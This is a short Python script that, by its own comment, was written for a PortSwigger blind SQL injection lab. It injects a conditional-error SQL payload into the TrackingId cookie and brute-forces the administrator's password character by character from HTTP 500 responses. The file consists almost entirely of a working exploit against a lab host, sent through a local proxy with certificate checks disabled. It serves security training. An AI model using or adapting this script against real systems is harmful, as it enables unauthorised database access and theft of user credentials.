#developed this script while doing portswigger blind sql injection with conditional errors lab - takes for granted that you already know the password length is 20, that there is a users table, and that you know the columns in the table
import requests
import os
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning

proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
for x in range (1,21):

	for y in "0123456789abcdefghijklmnopqrstuvwxyz":

		cookies = {'TrackingId': "abc'||(SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM users WHERE username='administrator' and SUBSTR(password,{},1)='{}')||'".format(x,y), 'session': 'SjXMnQMrFpBaPEm9K6cIrVB8w6HpGZFF'}
		warnings.simplefilter('ignore',InsecureRequestWarning) #ignores insecure certificate warning
		response = requests.get('https://0aea00c5043d7abcc09a013a003400d1.web-security-academy.net/filter?category=Gifts',cookies=cookies, proxies=proxy, verify=False) #verify=False important to allow for the connection even though not secure
		if response.status_code == 500:
			print(y, sep=' ', end='', flush=True)
			break
